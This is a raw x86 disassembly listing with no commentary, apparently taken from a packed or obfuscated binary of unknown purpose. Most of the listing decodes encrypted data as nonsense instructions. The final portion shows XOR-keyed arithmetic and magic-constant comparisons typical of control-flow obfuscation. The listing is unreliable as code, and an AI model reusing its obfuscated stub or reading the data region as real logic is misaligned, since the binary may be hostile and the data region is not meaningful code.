  409fac:	rcl    DWORD PTR [eax+0x2c37a558],cl
  409fb2:	mov    al,0x43
  409fb4:	call   0x8121d072
  409fb9:	loope  0x409f9e
  409fbb:	cwde   
  409fbc:	outs   dx,BYTE PTR ds:[esi]
  409fbd:	jbe    0x409f5c
  409fbf:	push   edx
  409fc0:	fnstsw WORD PTR [ecx-0x16]
  409fc3:	jge    0x40a003
  409fc5:	mov    dh,ch
  409fc7:	mov    DWORD PTR [edi+0x3dad977e],ecx
  409fcd:	or     eax,esp
  409fcf:	jl     0x40a020
  409fd1:	repnz pop esi
  409fd3:	stos   BYTE PTR es:[edi],al
  409fd4:	fmul   QWORD PTR [ebx-0x2]
  409fd7:	pop    ebx
  409fd8:	and    eax,0x76281a8a
  409fdd:	imul   DWORD PTR [edx-0x5a]
  409fe0:	adc    edi,0x3395e9fc
  409fe6:	mov    edi,0xca701733
  409feb:	sbb    BYTE PTR [eax-0x42eeb39b],ch
  409ff1:	leavew 
  409ff3:	push   0x5bca0b1c
  409ff8:	adc    BYTE PTR [esi-0x2c],bh
  409ffb:	adc    DWORD PTR [edi+0x6491ca81],0xffffff9c
  40a002:	lods   al,BYTE PTR ds:[esi]
  40a003:	iret   
  40a004:	adc    dl,ch
  40a006:	nop
  40a007:	test   eax,0xedb0f858
  40a00c:	pop    esi
  40a00d:	jmp    0x10da:0xeb2f54b6
  40a014:	leave  
  40a015:	xor    al,BYTE PTR [edx+0xd]
  40a018:	jle    0x409fad
  40a01a:	nop
  40a01b:	fmulp  st(3),st
  40a01d:	gs pop edx
  40a01f:	pop    ebx
  40a020:	add    DWORD PTR [ecx+0xe8228c0],esi
  40a026:	dec    esp
  40a027:	jp     0x40a06b
  40a029:	repz out dx,al
  40a02b:	cs cmp al,0x46
  40a02e:	add    al,BYTE PTR [ebx+0x3d]
  40a031:	int3   
  40a032:	retf   
  40a033:	fild   WORD PTR [ebx+0x7887f8c0]
  40a039:	inc    esi
  40a03a:	cmp    al,0x28
  40a03c:	imul   ecx,DWORD PTR [edi+0x6f30de77],0xffffffb5
  40a043:	arpl   ax,cx
  40a045:	lods   al,BYTE PTR ds:[esi]
  40a046:	and    edx,DWORD PTR [edx]
  40a048:	add    DWORD PTR [esi],0xcfaf644c
  40a04e:	ds cmp eax,0x55e911bf
  40a054:	iret   
  40a055:	lahf   
  40a056:	jnp    0x40a0ad
  40a058:	les    esi,FWORD PTR [eax-0x44dfb723]
  40a05e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a05f:	in     al,dx
  40a060:	mov    eax,0x7a6d4882
  40a065:	pop    ebx
  40a066:	inc    esi
  40a067:	js     0x40a047
  40a069:	test   al,0x3f
  40a06b:	mov    esp,0xfac0ea61
  40a070:	jecxz  0x40a083
  40a072:	mov    ecx,0xa9a7d5b8
  40a077:	xchg   esp,eax
  40a078:	adc    al,0x10
  40a07a:	test   eax,0x883407dc
  40a07f:	add    ah,BYTE PTR [eax]
  40a081:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a082:	mov    BYTE PTR [eax+0x1c],cl
  40a085:	jb     0x40a07e
  40a087:	push   ebp
  40a088:	pushf  
  40a089:	rol    edi,1
  40a08b:	pop    ds
  40a08c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a08d:	(bad)  
  40a08e:	mov    bh,0xb
  40a090:	dec    esi
  40a091:	xchg   edi,eax
  40a092:	add    DWORD PTR [bx],0x7d
  40a096:	add    BYTE PTR [esi+0x7c297414],ch
  40a09c:	pop    ds
  40a09d:	es push ebx
  40a09f:	mov    ds:0x92fe4e3a,al
  40a0a4:	jae    0x40a09d
  40a0a6:	jmp    0xe1cdb95c
  40a0ab:	repz xchg edx,eax
  40a0ad:	xor    ebx,ecx
  40a0af:	pop    edx
  40a0b0:	mov    cl,0x81
  40a0b2:	fst    st(0)
  40a0b4:	cli    
  40a0b5:	shr    DWORD PTR [ecx+edx*4+0x289b058c],0x8f
  40a0bd:	scas   eax,DWORD PTR es:[edi]
  40a0be:	arpl   ax,ax
  40a0c0:	dec    ebx
  40a0c1:	scas   al,BYTE PTR es:[edi]
  40a0c2:	test   al,0xd5
  40a0c4:	and    ebp,DWORD PTR [ecx]
  40a0c6:	jg     0x40a0da
  40a0c8:	(bad)  [edx-0x38]
  40a0cb:	xchg   edi,eax
  40a0cc:	jl     0x40a100
  40a0ce:	jb     0x40a080
  40a0d0:	imul   ebp,DWORD PTR [edi],0x19
  40a0d3:	popa   
  40a0d4:	mov    dl,bl
  40a0d6:	and    ah,0xfc
  40a0d9:	push   ds
  40a0da:	push   edi
  40a0db:	sar    DWORD PTR [edi+0x6ec19425],0xe5
  40a0e2:	push   eax
  40a0e3:	popw   es
  40a0e5:	call   0x8c3e:0xa5938517
  40a0ec:	xchg   DWORD PTR [esp+ecx*1],esi
  40a0ef:	pop    ss
  40a0f0:	mov    bl,0x11
  40a0f2:	hlt    
  40a0f3:	jmp    0xf26b9e15
  40a0f8:	ret    
  40a0f9:	xor    edi,esp
  40a0fb:	adc    eax,0x17ee1cec
  40a100:	push   ebx
  40a101:	xchg   ebx,ebp
  40a103:	arpl   WORD PTR [esi-0x757f3d5c],sp
  40a109:	aaa    
  40a10a:	push   edx
  40a10b:	scas   eax,DWORD PTR es:[edi]
  40a10c:	lock xor bh,BYTE PTR [ebp-0x2b]
  40a110:	sbb    esi,DWORD PTR [eax+0x349a18ce]
  40a116:	inc    ebx
  40a117:	fs mov edi,0xfc0a54a0
  40a11d:	jne    0x40a198
  40a11f:	inc    ecx
  40a120:	icebp  
  40a121:	in     al,dx
  40a122:	sbb    dh,cl
  40a124:	jb     0x40a0e7
  40a126:	inc    eax
  40a127:	pusha  
  40a128:	sub    dh,0xfe
  40a12b:	mov    ch,0x3f
  40a12d:	or     eax,0xb0337ddd
  40a132:	mov    ebp,0xa5d2821d
  40a137:	cmc    
  40a138:	mov    edi,0xf69e04c0
  40a13d:	dec    esi
  40a13e:	in     eax,0xc6
  40a140:	adc    dh,bh
  40a142:	repz inc esi
  40a144:	sahf   
  40a145:	or     eax,0x43358556
  40a14a:	aam    0x61
  40a14c:	push   ss
  40a14d:	or     dl,BYTE PTR [edx]
  40a14f:	in     al,dx
  40a150:	fwait
  40a151:	aad    0x75
  40a153:	or     eax,DWORD PTR [edi+ebp*1+0x0]
  40a157:	or     BYTE PTR [ebp+0x44b3d695],ch
  40a15d:	mov    edi,0x7c48a22c
  40a162:	dec    ebx
  40a163:	or     al,0x54
  40a165:	jne    0x40a129
  40a167:	push   cs
  40a168:	adc    edi,esp
  40a16a:	ja     0x40a153
  40a16c:	jle    0x40a15a
  40a16e:	retf   0xc8ae
  40a171:	jp     0x40a126
  40a173:	xchg   ebp,eax
  40a174:	push   0xa0854ed3
  40a179:	push   ss
  40a17a:	aas    
  40a17b:	stos   DWORD PTR es:[edi],eax
  40a17c:	stos   DWORD PTR es:[edi],eax
  40a17d:	mov    esp,0xe8ba9c13
  40a182:	mov    eax,ds:0xf9713b17
  40a187:	inc    esi
  40a188:	cld    
  40a189:	cmp    BYTE PTR [eax],cl
  40a18b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a18c:	push   0xfffffff9
  40a18e:	stos   BYTE PTR es:[edi],al
  40a18f:	cmp    al,BYTE PTR [eax]
  40a191:	sbb    ebp,esi
  40a193:	pop    edx
  40a194:	pusha  
  40a195:	(bad)  
  40a196:	call   0xf6741d74
  40a19b:	push   ecx
  40a19c:	rol    DWORD PTR [ebx-0x33cad46b],cl
  40a1a2:	sbb    ecx,DWORD PTR [edi+0x378203f1]
  40a1a8:	iret   
  40a1a9:	lods   eax,DWORD PTR ds:[esi]
  40a1aa:	shl    BYTE PTR [edx],0x6f
  40a1ad:	mov    esp,DWORD PTR [eax-0x7a]
  40a1b0:	pop    edi
  40a1b1:	mov    bl,0xc0
  40a1b3:	lods   eax,DWORD PTR ds:[esi]
  40a1b4:	shl    BYTE PTR [edi+0x56],cl
  40a1b7:	inc    ebx
  40a1b8:	dec    ebp
  40a1b9:	je     0x40a177
  40a1bb:	pop    ebp
  40a1bc:	jmp    0x40a19c
  40a1be:	mov    edx,0x8d21a956
  40a1c3:	call   0x91d2:0x394f8041
  40a1ca:	nop
  40a1cb:	int    0x62
  40a1cd:	cmc    
  40a1ce:	lods   al,BYTE PTR ds:[esi]
  40a1cf:	xchg   edi,eax
  40a1d0:	lods   eax,DWORD PTR ds:[esi]
  40a1d1:	jmp    0xb1dd668b
  40a1d6:	cmp    bl,BYTE PTR [eax-0x4b650a78]
  40a1dc:	cmp    ch,0x5c
  40a1df:	aas    
  40a1e0:	ins    BYTE PTR es:[edi],dx
  40a1e1:	les    ebp,FWORD PTR [edx]
  40a1e3:	fwait
  40a1e4:	and    eax,0x12ba7a8a
  40a1e9:	mov    bh,ah
  40a1eb:	ja     0x40a26c
  40a1ed:	ins    DWORD PTR es:[edi],dx
  40a1ee:	xor    edi,eax
  40a1f0:	xchg   ebx,eax
  40a1f1:	adc    DWORD PTR [edi-0x1e],edx
  40a1f4:	pop    esi
  40a1f5:	stos   BYTE PTR es:[edi],al
  40a1f6:	or     dl,dl
  40a1f8:	sub    BYTE PTR [edi-0x7c],bh
  40a1fb:	fmul   st,st(0)
  40a1fd:	js     0x40a277
  40a1ff:	js     0x40a1e9
  40a201:	sub    DWORD PTR [ecx],ebx
  40a203:	fldcw  WORD PTR [edx+esi*2+0x63498614]
  40a20a:	push   esp
  40a20b:	cmp    ebx,DWORD PTR [ecx+eiz*2+0x1f]
  40a20f:	lods   al,BYTE PTR ds:[esi]
  40a210:	xor    eax,0xde36eba1
  40a215:	inc    esi
  40a216:	sbb    al,0x82
  40a218:	sti    
  40a219:	jmpw   0xd949
  40a21d:	jb     0x40a245
  40a21f:	xlat   BYTE PTR ds:[ebx]
  40a220:	add    edi,esi
  40a222:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  40a224:	test   al,0xba
  40a226:	mov    esp,DWORD PTR [ebx+eax*1-0x4ff3c00a]
  40a22d:	or     BYTE PTR [ecx-0x28],ah
  40a230:	aad    0x7b
  40a232:	outs   dx,BYTE PTR ds:[esi]
  40a233:	mov    edx,DWORD PTR [edx]
  40a235:	cli    
  40a236:	jg     0x40a1b8
  40a238:	int    0x3
  40a23a:	sub    cl,0x56
  40a23d:	mov    cl,0xeb
  40a23f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a240:	mov    ds:0xe92402ae,al
  40a245:	in     eax,dx
  40a246:	test   BYTE PTR [edi-0x4],dl
  40a249:	jp     0x40a200
  40a24b:	test   DWORD PTR [edi-0x2544a83d],ecx
  40a251:	add    esp,eax
  40a253:	stos   DWORD PTR es:[edi],eax
  40a254:	mov    DWORD PTR [ebx],ebx
  40a256:	repz inc ebx
  40a258:	jb     0x40a275
  40a25a:	mov    esi,DWORD PTR [edx+0x56]
  40a25d:	and    al,al
  40a25f:	jbe    0x40a1f0
  40a261:	sti    
  40a262:	mov    eax,ds:0xa2d9df54
  40a267:	icebp  
  40a268:	sbb    eax,edi
  40a26a:	sbb    cl,BYTE PTR [esi+0x78]
  40a26d:	rcr    bh,0x7f
  40a270:	and    ebp,eax
  40a272:	stos   DWORD PTR es:[edi],eax
  40a273:	jmp    0x85cb9692
  40a278:	dec    ebx
  40a279:	dec    edi
  40a27a:	sbb    BYTE PTR [edi],0x72
  40a27d:	enter  0x71f1,0xc5
  40a281:	js     0x40a248
  40a283:	pusha  
  40a284:	out    dx,al
  40a285:	loopne 0x40a251
  40a287:	daa    
  40a288:	pushf  
  40a289:	in     eax,dx
  40a28a:	sub    al,0xe1
  40a28c:	imul   ecx,edx,0x5f3c6981
  40a292:	ss push ebx
  40a294:	icebp  
  40a295:	or     BYTE PTR [ecx],dh
  40a297:	push   edx
  40a298:	jns    0x40a21d
  40a29a:	add    eax,0x8879e104
  40a29f:	jp     0x40a28d
  40a2a1:	into   
  40a2a2:	xchg   DWORD PTR [edi-0x4c],esi
  40a2a5:	push   ebx
  40a2a6:	mov    edi,0x32c0bd26
  40a2ab:	dec    esi
  40a2ac:	dec    eax
  40a2ad:	xchg   DWORD PTR [esi+0xfafd65b],edx
  40a2b3:	add    al,dh
  40a2b5:	ds cs dec ebx
  40a2b8:	adc    DWORD PTR [ecx+edx*2+0x191799a7],0x5d5df621
  40a2c3:	fsub   st,st(6)
  40a2c5:	cmp    DWORD PTR [eax-0x648db9b5],eax
  40a2cb:	outs   dx,DWORD PTR ds:[esi]
  40a2cc:	stos   BYTE PTR es:[edi],al
  40a2cd:	stc    
  40a2ce:	sub    eax,0x401283d5
  40a2d3:	mov    esi,0x7890f5cb
  40a2d8:	mov    edx,DWORD PTR [edx]
  40a2da:	cmp    al,BYTE PTR [edx+0x25]
  40a2dd:	shl    DWORD PTR [ebp-0x8f3534],1
  40a2e3:	(bad)  
  40a2e4:	mov    al,0x3b
  40a2e6:	adc    dl,BYTE PTR [esi-0x6d]
  40a2e9:	xchg   ebx,eax
  40a2ea:	mov    esi,0x991c308
  40a2ef:	(bad)  
  40a2f0:	retf   0xaae5
  40a2f3:	sub    bh,BYTE PTR [ebp+ecx*4+0x2cca06bc]
  40a2fa:	cmp    DWORD PTR [edx],esi
  40a2fc:	nop
  40a2fd:	clc    
  40a2fe:	pop    ecx
  40a2ff:	jns    0x40a375
  40a301:	ins    DWORD PTR es:[edi],dx
  40a302:	outs   dx,BYTE PTR ds:[esi]
  40a303:	jno    0x40a341
  40a305:	pop    edx
  40a306:	and    DWORD PTR [ecx],esi
  40a308:	ins    BYTE PTR es:[edi],dx
  40a309:	test   BYTE PTR [edx-0x3578eb44],cl
  40a30f:	jne    0x40a2a8
  40a311:	push   es
  40a312:	jnp    0x40a35f
  40a314:	push   ebx
  40a315:	add    BYTE PTR [ebx-0x679e1f0c],0xf7
  40a31c:	fnstcw WORD PTR [esi+0x6090d10c]
  40a322:	int    0x4b
  40a324:	xchg   ebp,eax
  40a325:	mov    ebp,0xe9a4c101
  40a32a:	and    ah,ch
  40a32c:	rcr    cl,0x9f
  40a32f:	xlat   BYTE PTR ds:[ebx]
  40a330:	cmp    al,0x90
  40a332:	int    0x94
  40a334:	mov    bl,0x90
  40a336:	cmp    cl,BYTE PTR [ebp+0x13]
  40a339:	enter  0xe4e5,0x51
  40a33d:	popa   
  40a33e:	xchg   edi,eax
  40a33f:	jbe    0x40a351
  40a341:	clc    
  40a342:	enter  0xa7b6,0x73
  40a346:	jnp    0x40a354
  40a348:	repz int3 
  40a34a:	dec    ebp
  40a34b:	inc    ebx
  40a34c:	mov    BYTE PTR [eax],bl
  40a34e:	shl    ah,1
  40a350:	mov    ah,0x6c
  40a352:	out    dx,al
  40a353:	ja     0x40a334
  40a355:	xor    bh,BYTE PTR [eax]
  40a357:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a359:	out    dx,al
  40a35a:	add    ecx,ebx
  40a35c:	repz inc ebp
  40a35e:	mov    esp,0x247dc746
  40a363:	xchg   esi,eax
  40a364:	jp     0x40a3c3
  40a366:	mov    bh,0x24
  40a368:	and    al,0xcc
  40a36a:	jge    0x40a3a0
  40a36c:	imul   ebp,ecx,0xf9e8fc74
  40a372:	int3   
  40a373:	nop
  40a374:	(bad)  
  40a375:	mov    dl,0x5c
  40a377:	iret   
  40a378:	stos   DWORD PTR es:[edi],eax
  40a379:	or     al,0x39
  40a37b:	xchg   esi,eax
  40a37c:	scas   al,BYTE PTR es:[edi]
  40a37d:	fwait
  40a37e:	xor    BYTE PTR [eax+0x3b],bh
  40a381:	and    eax,0xfe3b110e
  40a386:	cmp    DWORD PTR [eax],esp
  40a388:	dec    edx
  40a389:	push   es
  40a38a:	jnp    0x40a347
  40a38c:	loope  0x40a3b0
  40a38e:	pusha  
  40a38f:	mov    ds,WORD PTR [esi-0x3ab33d0a]
  40a395:	sbb    al,BYTE PTR [eax]
  40a397:	je     0x40a346
  40a399:	push   esp
  40a39a:	jmp    0x25745810
  40a39f:	mov    WORD PTR [eax+0x1],?
  40a3a2:	(bad)  
  40a3a3:	pop    ecx
  40a3a4:	sbb    DWORD PTR [edi+0x3e6edcb6],0xffffffa2
  40a3ab:	int3   
  40a3ac:	cmp    ah,BYTE PTR [edx-0x28]
  40a3af:	pop    edi
  40a3b0:	pop    edx
  40a3b1:	call   0xeaf3:0x89fb9f98
  40a3b8:	aas    
  40a3b9:	fwait
  40a3ba:	daa    
  40a3bb:	ja     0x40a3a8
  40a3bd:	outs   dx,DWORD PTR ds:[esi]
  40a3be:	(bad)  
  40a3bf:	pop    ds
  40a3c0:	dec    ebp
  40a3c1:	pop    ebp
  40a3c2:	sub    al,0x48
  40a3c4:	dec    edi
  40a3c5:	cdq    
  40a3c6:	pop    esi
  40a3c7:	in     eax,0x12
  40a3c9:	jno    0x40a424
  40a3cb:	shl    DWORD PTR [edi],1
  40a3cd:	jno    0x40a382
  40a3cf:	sahf   
  40a3d0:	stc    
  40a3d1:	repz sub DWORD PTR [esi],ebp
  40a3d4:	dec    esp
  40a3d5:	inc    eax
  40a3d6:	nop
  40a3d7:	cld    
  40a3d8:	pushf  
  40a3d9:	dec    esp
  40a3da:	fstp   DWORD PTR [ebx-0x23]
  40a3dd:	xchg   esi,eax
  40a3de:	loop   0x40a39c
  40a3e0:	xor    DWORD PTR [ebx+0x51],edi
  40a3e3:	in     eax,dx
  40a3e4:	cli    
  40a3e5:	inc    edx
  40a3e6:	xor    BYTE PTR [edi-0x4c1ee5b0],dh
  40a3ec:	scas   eax,DWORD PTR es:[edi]
  40a3ed:	or     eax,0x50b97a49
  40a3f2:	lds    ebp,FWORD PTR [ebx+0xa]
  40a3f5:	jl     0x40a41c
  40a3f7:	push   eax
  40a3f8:	repnz mov ecx,0x74712054
  40a3fe:	pop    ecx
  40a3ff:	dec    edx
  40a400:	in     al,0xb5
  40a402:	pop    esi
  40a403:	repz in eax,dx
  40a405:	pop    eax
  40a406:	pop    edx
  40a407:	pop    ss
  40a408:	jae    0x40a41e
  40a40a:	cmp    eax,0x361fc2dc
  40a40f:	jecxz  0x40a401
  40a411:	and    al,0xd0
  40a413:	pusha  
  40a414:	call   0x4a28e235
  40a419:	ret    
  40a41a:	mov    ?,ebx
  40a41c:	sbb    ch,BYTE PTR [eax]
  40a41e:	mov    edx,0x5283bc2b
  40a423:	sub    edi,esi
  40a425:	mov    ebp,0x89619918
  40a42a:	pushf  
  40a42b:	aas    
  40a42c:	sub    BYTE PTR [eax-0x23],cl
  40a42f:	cmp    dh,al
  40a431:	mov    al,ds:0x94541ca8
  40a436:	cld    
  40a437:	rol    DWORD PTR ds:0x18c486f4,cl
  40a43d:	mov    eax,DWORD PTR [eax+ebp*8+0x19]
  40a441:	(bad)  
  40a442:	cmp    al,bh
  40a444:	inc    esp
  40a445:	sub    BYTE PTR [edx-0x70],al
  40a448:	jmp    0x40a44a
  40a44a:	test   DWORD PTR [esi],0x68bda869
  40a450:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a451:	out    0xf7,al
  40a453:	adc    ebx,ebp
  40a455:	into   
  40a456:	add    ebp,DWORD PTR [ecx]
  40a458:	mov    al,0x6a
  40a45a:	addr16 push cs
  40a45c:	xlat   BYTE PTR ds:[ebx]
  40a45d:	stos   DWORD PTR es:[edi],eax
  40a45e:	adc    cl,BYTE PTR [edx+0x20]
  40a461:	adc    eax,0x6c5345e2
  40a466:	push   ds
  40a467:	popf   
  40a468:	jmp    0x40a403
  40a46a:	or     edi,DWORD PTR [edx]
  40a46c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a46d:	pop    ss
  40a46e:	dec    ecx
  40a46f:	imul   edi,ecx,0xb76213db
  40a475:	out    0x46,al
  40a477:	jg     0x40a41e
  40a479:	fdiv   QWORD PTR [esi+edx*8+0x5]
  40a47d:	fdivr  st(2),st
  40a47f:	add    al,0xda
  40a481:	and    ch,BYTE PTR [edi+0xde55b88]
  40a487:	add    DWORD PTR [ecx-0x3c4707f7],0x3d
  40a48e:	dec    edx
  40a48f:	sahf   
  40a490:	or     dl,dl
  40a492:	mov    al,0x32
  40a494:	into   
  40a495:	jo     0x40a45a
  40a497:	ins    DWORD PTR es:[edi],dx
  40a498:	xor    ebp,esi
  40a49a:	jb     0x40a508
  40a49c:	jne    0x40a4c7
  40a49e:	js     0x40a476
  40a4a0:	pop    edi
  40a4a1:	sbb    al,0x87
  40a4a3:	cs mov dh,0x4f
  40a4a6:	clc    
  40a4a7:	pusha  
  40a4a8:	dec    esi
  40a4a9:	out    0x70,al
  40a4ab:	push   eax
  40a4ac:	(bad)  
  40a4ad:	(bad)  
  40a4ae:	push   ss
  40a4af:	ins    BYTE PTR es:[edi],dx
  40a4b0:	(bad)  
  40a4b1:	jae    0x40a49c
  40a4b3:	das    
  40a4b4:	lahf   
  40a4b5:	mov    ebx,DWORD PTR [edi+ecx*2]
  40a4b8:	push   esp
  40a4b9:	enter  0x1b67,0x5
  40a4bd:	jg     0x40a4bc
  40a4bf:	data16 jle 0x40a4d4
  40a4c2:	cmp    al,0xc9
  40a4c4:	aaa    
  40a4c5:	dec    esp
  40a4c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a4c7:	mov    ebx,DWORD PTR [eax]
  40a4c9:	mov    cl,0x4c
  40a4cb:	mov    ebx,0x8f373dcb
  40a4d0:	push   ebp
  40a4d1:	dec    edx
  40a4d2:	sub    ebp,DWORD PTR [edx]
  40a4d4:	in     al,dx
  40a4d5:	rcl    DWORD PTR [eax],1
  40a4d7:	int    0x78
  40a4d9:	hlt    
  40a4da:	push   ebp
  40a4db:	sbb    BYTE PTR [edx-0x25a4675f],bl
  40a4e1:	test   DWORD PTR [esi],0xe3cbe2a8
  40a4e7:	aaa    
  40a4e8:	fdiv   QWORD PTR [edx-0x48cf9ef0]
  40a4ee:	ins    BYTE PTR es:[edi],dx
  40a4ef:	add    al,0x2d
  40a4f2:	clc    
  40a4f3:	fsub   QWORD PTR [ebp+0x58]
  40a4f6:	call   0x51f8:0x3d8ebc6b
  40a4fd:	in     al,0x44
  40a4ff:	xchg   ch,cl
  40a501:	outs   dx,BYTE PTR ds:[esi]
  40a502:	cdq    
  40a503:	sub    DWORD PTR ds:0x6042676c,esi
  40a509:	loop   0x40a57c
  40a50b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a50c:	xchg   ebp,eax
  40a50d:	push   esp
  40a50e:	icebp  
  40a50f:	fimul  DWORD PTR [esi]
  40a511:	lsl    ebx,sp
  40a514:	int    0x35
  40a516:	inc    ebx
  40a517:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a518:	fldcw  WORD PTR ds:0x942d4c1e
  40a51e:	daa    
  40a51f:	loope  0x40a4e7
  40a521:	(bad)  
  40a522:	enter  0x3002,0xb3
  40a526:	push   ebx
  40a527:	pop    edx
  40a528:	popa   
  40a529:	jae    0x40a4c2
  40a52b:	jge    0x40a517
  40a52d:	js     0x40a53f
  40a52f:	outs   dx,DWORD PTR ds:[esi]
  40a530:	xchg   esi,eax
  40a531:	fndisi(8087 only) 
  40a533:	mov    bh,0x10
  40a535:	sahf   
  40a536:	jae    0x40a5a0
  40a538:	push   esi
  40a539:	and    dl,0x43
  40a53c:	or     DWORD PTR [edx+0x35df3538],esp
  40a542:	xlat   BYTE PTR ds:[ebx]
  40a543:	cs jecxz 0x40a5bf
  40a546:	jp     0x40a592
  40a548:	push   0x71d56c84
  40a54d:	and    al,0x3f
  40a54f:	les    esp,FWORD PTR [ebp-0x23d4e450]
  40a555:	push   ebp
  40a556:	outs   dx,BYTE PTR ds:[esi]
  40a557:	mov    DWORD PTR [eax+0x74],ebp
  40a55a:	push   edx
  40a55b:	push   ecx
  40a55c:	in     eax,0xc9
  40a55e:	pop    ebx
  40a55f:	jecxz  0x40a551
  40a561:	push   cs
  40a562:	aaa    
  40a563:	or     BYTE PTR [edi],ch
  40a565:	lea    edi,[edx+0x43]
  40a568:	push   ecx
  40a569:	add    al,0xd2
  40a56b:	js     0x40a5d4
  40a56d:	cs mov dh,0x3
  40a570:	aaa    
  40a571:	pusha  
  40a572:	inc    ebx
  40a573:	or     BYTE PTR [edi],0x26
  40a576:	outs   dx,BYTE PTR ds:[esi]
  40a577:	dec    edx
  40a578:	mov    edi,0xfe5f3c6e
  40a57d:	ja     0x40a5c3
  40a57f:	inc    edx
  40a580:	push   eax
  40a581:	mov    esi,gs
  40a583:	pop    ecx
  40a584:	sbb    ah,BYTE PTR [ecx-0x6c1af693]
  40a58a:	lock or al,0x3
  40a58d:	jp     0x40a569
  40a58f:	pushfw 
  40a591:	icebp  
  40a592:	jge    0x40a592
  40a594:	mov    bh,0xc8
  40a596:	sahf   
  40a597:	into   
  40a598:	jns    0x40a5e0
  40a59a:	xchg   ebp,eax
  40a59b:	jg     0x40a5b2
  40a59d:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  40a59f:	or     DWORD PTR [edi-0x7],ebx
  40a5a2:	shl    esp,1
  40a5a4:	or     eax,0x53e4a517
  40a5a9:	and    DWORD PTR [edi-0x65],esp
  40a5ac:	scas   eax,DWORD PTR es:[edi]
  40a5ad:	sub    eax,0xb616bad0
  40a5b2:	test   DWORD PTR [eax+0x5b],esi
  40a5b5:	fcomip st,st(3)
  40a5b7:	adc    BYTE PTR [edi+0x53],dh
  40a5ba:	aad    0x64
  40a5bc:	in     eax,0x88
  40a5be:	pop    esp
  40a5bf:	and    DWORD PTR [edi-0x61],0xfd97e8f1
  40a5c6:	mov    cl,0x9c
  40a5c8:	dec    edx
  40a5c9:	out    0x71,eax
  40a5cb:	stos   DWORD PTR es:[edi],eax
  40a5cc:	pop    ds
  40a5cd:	nop
  40a5ce:	ret    
  40a5cf:	in     eax,dx
  40a5d0:	in     eax,dx
  40a5d1:	ficom  WORD PTR [ebp+0x6daa4bec]
  40a5d7:	inc    ebp
  40a5d8:	cmp    bl,cl
  40a5da:	int3   
  40a5db:	jg     0x40a63a
  40a5dd:	addr16 cmp bh,dl
  40a5e0:	enter  0x8e55,0xa7
  40a5e4:	shl    DWORD PTR [ecx-0x4d],0x62
  40a5e8:	push   ebp
  40a5e9:	aam    0x11
  40a5eb:	pusha  
  40a5ec:	stc    
  40a5ed:	je     0x40a616
  40a5ef:	outs   dx,BYTE PTR ds:[esi]
  40a5f0:	ror    DWORD PTR [ecx-0x25],1
  40a5f3:	push   cs
  40a5f4:	cmp    ch,dh
  40a5f6:	and    BYTE PTR [esi],bh
  40a5f8:	pop    ss
  40a5f9:	inc    ecx
  40a5fa:	dec    ebp
  40a5fb:	mov    ch,BYTE PTR [esi+ebx*4]
  40a5fe:	mov    esp,0xccea73b0
  40a603:	imul   eax,DWORD PTR ds:[ecx-0x36],0x39
  40a608:	hlt    
  40a609:	adc    ebx,edi
  40a60b:	jnp    0x40a59e
  40a60d:	xchg   esp,eax
  40a60e:	cs xchg cx,ax
  40a611:	mov    ecx,0x4e9ce658
  40a616:	pop    esp
  40a617:	push   es
  40a618:	popa   
  40a619:	sbb    BYTE PTR [esi-0x39723c84],0x2d
  40a620:	jo     0x40a62d
  40a622:	adc    BYTE PTR [ebp-0x25],dl
  40a625:	mov    ds:0xe0c82241,al
  40a62a:	mov    ds,edx
  40a62c:	jae    0x40a621
  40a62e:	xor    al,BYTE PTR [edi-0x2f]
  40a631:	test   al,0x88
  40a633:	cdq    
  40a634:	mov    dh,0xfc
  40a636:	clc    
  40a637:	adc    BYTE PTR [ebx+0xd11f445],cl
  40a63d:	(bad)  
  40a63e:	mov    ds:0x4d8b0042,al
  40a643:	fadd   DWORD PTR [ecx+0x42a2ce2d]
  40a649:	add    dl,dh
  40a64b:	mov    ds:0xc72b0042,al
  40a650:	and    DWORD PTR ds:0x42a25a,0x42a2f2
  40a65a:	xor    eax,esi
  40a65c:	cmp    eax,ecx
  40a65e:	jne    0x40a688
  40a664:	mov    eax,DWORD PTR [ebp-0x8]
  40a667:	mov    ecx,DWORD PTR [ebp-0x10]
  40a66a:	xor    eax,esi
  40a66c:	xor    ecx,esi
  40a66e:	sub    eax,ecx
  40a670:	sub    eax,edi
  40a672:	xor    eax,esi
  40a674:	mov    DWORD PTR [ebp-0x8],eax
  40a677:	mov    eax,DWORD PTR [ebp-0x10]
  40a67a:	xor    eax,esi
  40a67c:	mov    ecx,0xffcd8d8f
  40a681:	sub    ecx,eax
  40a683:	jmp    0x40a697
  40a688:	mov    eax,DWORD PTR [ebp-0x10]
  40a68b:	xor    eax,esi
  40a68d:	mov    ecx,0xffcd8d0f
  40a692:	sub    ecx,eax
  40a694:	add    ecx,DWORD PTR [ebp-0xc]
  40a697:	mov    DWORD PTR [ebp-0xc],ecx
  40a69a:	mov    eax,DWORD PTR [ebp-0x8]
  40a69d:	cmp    eax,0xf89c85a5
  40a6a2:	jne    0x4038a5
  40a6a8:	mov    DWORD PTR [ebp-0x34],0x9
  40a6af:	mov    ecx,DWORD PTR [ebp+0x8]
  40a6b2:	xor    ecx,esi
  40a6b4:	add    ecx,edi
  40a6b6:	jmp    0x40a916
  40a6bb:	lea    eax,[ecx+ebx*1]
  40a6be:	mov    DWORD PTR [ebp-0x2c],eax
  40a6c1:	mov    eax,DWORD PTR [ebp-0x58]
  40a6c4:	sub    eax,ecx
  40a6c6:	mov    DWORD PTR [ebp-0x1c],eax
  40a6c9:	mov    eax,DWORD PTR [ebp-0x1c]
  40a6cc:	mov    DWORD PTR [ebp-0x14],eax
  40a6cf:	mov    eax,DWORD PTR [ebp-0x2c]
  40a6d2:	mov    DWORD PTR [ebp-0x38],0xf89c85a5
  40a6d9:	mov    DWORD PTR [ebp-0x54],eax
